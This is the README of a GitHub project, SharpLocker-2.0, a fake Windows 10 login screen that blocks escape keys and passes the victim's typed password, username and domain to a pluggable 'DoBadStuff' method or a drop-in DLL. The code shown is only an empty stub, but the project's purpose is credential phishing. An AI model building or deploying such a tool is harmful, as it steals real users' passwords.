# SharpLocker-2.0
[SharpLocker](https://github.com/Pickfordmatt/SharpLocker) but betterer!

## What This Is
This incredibly well written program which is definitely not using everyone's favourite for creating desktop applications - WinForms, fakes a Windows 10 login screen to not trick stupid people into typing in their password.

## Features

 - Load user avatar image and display it
 - Load user display name and display it
 - Load wallpaper blur it and display it as background
 - Make other screens go black
 - Hide taskbar
 - Swallow often used key combinations to close or change the current window
 - Win-key not usable
 - Looks like the windows login ... at least a little bit
 - Load external .dll-Files for easy change of use 

## Usage
This program itself does not contain code that collects data ... if you know what I mean.
Therefor if you want to get access to information that this program is more or less secretly collecting and to do some *things* with it - **REJOICE** - we have implemented two ways for you to do so easily.

 ### Use The DefaultBadStuff - Class
You will find this class in the "Classes" folder. 
This super complex piece of code contains one extremely large and hard to understand function:

    public void Now(string password, string username, string domainName)  
    {
    
    }

  Why is it called "Now" you may ask yourself, well let me tell you. The function call looks like this:
  

    DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
Funny isn't it.
Anyway, if you want to get the data once the absolutely real login is performed you can just put your code into this function and this class and any other class you want to create in the project.
The "Now" function gets called when the login button is pressed or the login is triggered by an enter press key event. It forwards the currently entered password, the username and user domain name into your malicious intents.

### Create A .dll-File That Implements The IDoBadStuff Interface
If you do not want to alter the existing source code, which may or may not be easier. You can create a .dll file
that contains a class which implements the IDoBadStuff interface, which you can find in the "SharpLocker_2._0.Interfaces" namespace.
So why and how should you do this?
This way of accessing the user input data has to big **+** and one big **-**.

The good:
 - It allows you to quickly change the *functionality* of the program by just changing the .dll file.
 - You can update the main program without needing to reimplement your own data processing.
 
 The bad:
 
 - Instead of one .exe-file you will need one additional .dll-file.

Let's continue to the how.

 1. Create a new class library project
 2. Add a reference to the SharpLocker project
 3. Create a new class in your class library that implements the IDoBadStuff interface
 4. Implement the "Now" function
 5. Add your code
 6. Build your class library project
 7. Put the .dll-file in the same directory as the SharpLocker-.exe 
 
 On program start this project will load the first class which implements the interface from the first .dll-file found. Alphabetical order I guess. Other bad stuff is ignored.
If no fitting class is found the "DefaultBadStuff" class is used.
